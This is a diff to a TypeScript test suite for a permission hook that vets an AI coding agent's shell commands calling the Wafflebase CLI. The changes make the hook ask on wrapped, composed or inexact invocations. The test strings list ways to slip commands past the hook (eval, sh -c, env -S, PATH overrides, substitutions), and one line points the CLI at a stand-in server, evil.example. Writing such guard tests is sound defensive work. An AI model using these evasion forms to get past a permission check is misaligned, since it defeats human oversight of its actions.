@@ -216,14 +216,14 @@ describe('guard.decide', () => {
     expect(d?.reason).toContain('not in the Wafflebase plugin');
   });
 
-  it('never auto-allows a composed command, and still asks for its writes', () => {
-    expect(decide('wafflebase docs list | jq .')).toBeNull();
-    // A redirect is a local write like `--out`; `/dev/null` is not.
+  it('asks on every composed command that names wafflebase, reads included', () => {
+    expect(decide('wafflebase docs list | jq .')?.decision).toBe('ask');
+    // A redirect is a local write like `--out`, named in the prompt.
     expect(decide('wafflebase docs list > list.json')?.reason).toContain(
       'writes list.json on this machine',
     );
-    expect(decide('wafflebase docs list 2>/dev/null')).toBeNull();
-    expect(decide('wafflebase docs list 2>&1')).toBeNull();
+    expect(decide('wafflebase docs list 2>/dev/null')?.decision).toBe('ask');
+    expect(decide('wafflebase docs list 2>&1')?.decision).toBe('ask');
     expect(decide('wafflebase docs delete x 2>&1')?.decision).toBe('ask');
     expect(decide('wafflebase docs list && wafflebase docs delete x')?.decision).toBe('ask');
     expect(decide('true; wafflebase docs delete x')?.decision).toBe('ask');
@@ -232,7 +232,7 @@ describe('guard.decide', () => {
   });
 
   it('does not auto-allow an invocation that may not be the installed CLI', () => {
-    expect(decide('./wafflebase docs list')).toBeNull();
+    expect(decide('./wafflebase docs list')?.decision).toBe('ask');
     expect(decide('PATH=/tmp wafflebase docs list')?.decision).toBe('ask');
     expect(decide('PATH=/tmp wafflebase docs delete x')?.decision).toBe('ask');
   });
@@ -269,8 +269,8 @@ describe('guard.decide', () => {
     ]) {
       expect(decide(cmd)?.decision, cmd).toBe('ask');
     }
-    // …and never auto-allows them, even when read-only.
-    expect(decide('time wafflebase docs list')).toBeNull();
+    // …and asks on them even when read-only: a wrapper is not exact.
+    expect(decide('time wafflebase docs list')?.decision).toBe('ask');
   });
 
   it('asks when a wafflebase call hides in a substitution beside one it can see', () => {
@@ -335,8 +335,8 @@ describe('guard.decide', () => {
     expect(decide("sh -c 'wafflebase docs delete x'")?.decision).toBe('ask');
     expect(decide("env -S 'wafflebase docs delete x'")?.decision).toBe('ask');
     expect(decide('eval wafflebase docs delete x')?.decision).toBe('ask');
-    // …and never auto-allows what it finds there.
-    expect(decide("bash -c 'wafflebase docs list'")).toBeNull();
+    // …and asks on what it finds there, reads included.
+    expect(decide("bash -c 'wafflebase docs list'")?.decision).toBe('ask');
   });
 
   // PR review (CodeRabbit): forms that slipped past the guard.
@@ -421,8 +421,8 @@ describe('guard.decide', () => {
     ]) {
       expect(decide(cmd)?.decision, cmd).toBe('ask');
     }
-    // …but a pipeline that only mentions the word is not a call.
-    expect(decide('grep wafflebase README.md | head')).toBeNull();
+    // The strict rule: a composition that names it at all asks.
+    expect(decide('grep wafflebase README.md | head')?.decision).toBe('ask');
   });
 
   it('never echoes arguments on the unclassifiable paths', () => {
@@ -446,8 +446,8 @@ describe('guard.decide', () => {
     ]) {
       expect(decide(cmd)?.decision, cmd).toBe('ask');
     }
-    // A wrapped program that merely takes the name as data is not a call.
-    expect(decide('xargs grep wafflebase f')).toBeNull();
+    // Strict: the name in a non-exact command asks even as data.
+    expect(decide('xargs grep wafflebase f')?.decision).toBe('ask');
   });
 
   it('drops a descriptor number before a redirect and reads `< file`', () => {
@@ -515,13 +515,27 @@ describe('guard.decide', () => {
     expect(long.length).toBeLessThan(400);
   });
 
-  it('leaves other commands to the user', () => {
+  // Review panel, fourth pass: spellings the strict rule now covers
+  // without being told about them.
+  it('asks on spellings no rule enumerates', () => {
+    for (const cmd of [
+      'export WAFFLEBASE_SERVER=https://evil.example; wafflebase docs list',
+      '>out.txt wafflebase docs delete x',
+      '/usr/bin/env wafflebase docs delete x',
+      'echo $(npx @wafflebase/cli docs delete x)',
+      'chronic wafflebase docs delete x',
+    ]) {
+      expect(decide(cmd)?.decision, cmd).toBe('ask');
+    }
+  });
+
+  it('leaves other commands to the user — unless they name wafflebase inexactly', () => {
     expect(decide('ls -la')).toBeNull();
-    expect(decide('git commit -m "update wafflebase docs"')).toBeNull();
-    expect(decide("echo 'wafflebase docs delete x'")).toBeNull();
+    expect(decide('git commit -m "update wafflebase docs"')?.decision).toBe('ask');
+    expect(decide("echo 'wafflebase docs delete x'")?.decision).toBe('ask');
     // The repository path contains the name; that is not an invocation.
     expect(decide('cd /src/wafflebase/waffledocs && git status')).toBeNull();
-    expect(decide('wafflebase docs list # what is here')).toBeNull();
+    expect(decide('wafflebase docs list # what is here')?.decision).toBe('ask');
   });
 });
 
@@ -556,6 +570,23 @@ describe('hook entry points', () => {
     expect(
       runGuard(write, { CLAUDE_PLUGIN_OPTION_AUTO_APPROVE_WRITES: 'false' }).permissionDecision,
     ).toBe('ask');
+  });
+
+  it('fails toward asking when its table is unreadable', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'wb-guard-'));
+    for (const f of ['guard.mjs', 'guard-lib.mjs']) {
+      writeFileSync(join(dir, f), readFileSync(join(hooks, f)));
+    }
+    writeFileSync(join(dir, 'command-safety.json'), '{ not json');
+    const run = (command: string) => {
+      const r = spawnSync(process.execPath, [join(dir, 'guard.mjs')], {
+        input: JSON.stringify(bash(command)),
+        encoding: 'utf8',
+      });
+      return r.stdout ? JSON.parse(r.stdout).hookSpecificOutput : null;
+    };
+    expect(run('wafflebase docs list').permissionDecision).toBe('ask');
+    expect(run('ls -la')).toBeNull();
   });
 
   it('stays silent on other tools, other commands and malformed input', () => {
